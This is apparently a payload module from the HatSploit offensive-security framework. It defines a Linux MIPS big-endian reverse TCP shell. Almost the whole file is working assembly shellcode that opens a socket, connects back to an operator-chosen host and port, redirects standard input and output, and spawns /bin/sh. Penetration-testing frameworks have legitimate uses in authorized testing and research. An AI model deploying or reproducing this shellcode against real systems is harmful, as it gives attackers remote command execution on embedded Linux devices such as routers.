"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux mipsbe Shell Reverse TCP",
            'Payload': "linux/mipsbe/shell_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive reverse TCP shell for Linux "
                "with MIPS big-endian architecture."
            ),
            'Arch': ARCH_MIPSBE,
            'Platform': OS_LINUX,
            'Type': REVERSE_TCP,
        })

    def implant(self):
        return self.assemble(
            """
            start:
                addiu $s1, $zero, -3
                not $s1, $s1
                lw $a0, -1($sp)

            dup:
                move $a1, $s1
                addiu $v0, $zero, 0xfdf
                syscall 0x40404

                addiu $s0, $zero, -1
                addi $s1, $s1, -1
                bne $s1, $s0, dup

                slti $a2, $zero, -1
                lui $t7, 0x2f2f
                ori $t7, $t7, 0x6269
                sw $t7, -0x14($sp)
                lui $t6, 0x6e2f
                ori $t6, $t6, 0x7368
                sw $t6, -0x10($sp)
                sw $zero, -0xc($sp)
                addiu $a0, $sp, -0x14
                sw $a0, -8($sp)
                sw $zero, -4($sp)
                addiu $a1, $sp, -8
                addiu $v0, $zero, 0xfab
                syscall 0x40404
            """
        )

    def run(self):
        return self.assemble(
            f"""
            start:
                addiu $t7, $zero, -6
                not $t7, $t7
                addi $a0, $t7, -3
                addi $a1, $t7, -3
                slti $a2, $zero, -1
                addiu $v0, $zero, 0x1057
                syscall 0x40404

                sw $v0, -1($sp)
                lw $a0, -1($sp)
                ori $t7, $zero, 0xfffd
                not $t7, $t7
                sw $t7, -0x20($sp)
                lui $t6, 0x{self.rport.big.hex()}
                ori $t6, $t6, 0x{self.rport.big.hex()}
                sw $t6, -0x1c($sp)
                lui $t6, 0x{self.rhost.big[:2].hex()}
                ori $t6, $t6, 0x{self.rhost.big[2:].hex()}
                sw $t6, -0x1a($sp)
                addiu $a1, $sp, -0x1e
                addiu $t4, $zero, -0x11
                not $a2, $t4
                addiu $v0, $zero, 0x104a
                syscall 0x40404
            """
        ) + self.implant()
